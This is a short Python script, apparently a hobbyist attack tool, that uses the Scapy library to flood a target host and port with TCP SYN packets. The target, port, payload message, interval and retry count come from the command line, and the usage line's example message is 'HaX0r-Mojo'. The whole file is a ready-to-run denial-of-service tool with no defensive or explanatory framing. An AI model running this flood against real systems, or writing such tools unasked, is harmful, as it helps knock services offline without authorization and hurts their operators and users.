import sys
from scapy.all import *

def SYNflood(target,dport,msg,val1,val2,val3,vb):
	packet = IP()/TCP()/msg
	packet[IP].dst = target
	packet[IP].id = 1111
	packet[IP].ttl = 99
	packet[TCP].sport = RandShort()
	packet[TCP].dport = dport
	packet[TCP].seq = 12345
	packet[TCP].ack = 1000
	packet[TCP].window = 1000
	packet[TCP].flags = "S"
	ans, unans = srloop(packet, inter=val1, timeout=val2, retry=val3, verbose=vb)
	
if len(sys.argv) != 8:
    print "Usage: SYNflood.py <target> <port> <msg> <interval> <timeout> <retry> <verbose>\n  eg: SYNflood.py 192.168.1.1 80 HaX0r-Mojo 0.3 4 2 0"
    sys.exit(1)

SYNflood(sys.argv[1], int(sys.argv[2]), sys.argv[3], float(sys.argv[4]), int(sys.argv[5]), int(sys.argv[6]), int(sys.argv[7]))

#ans.make_table(lambda(s,r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))
#unans.summary()
#ans.summary()
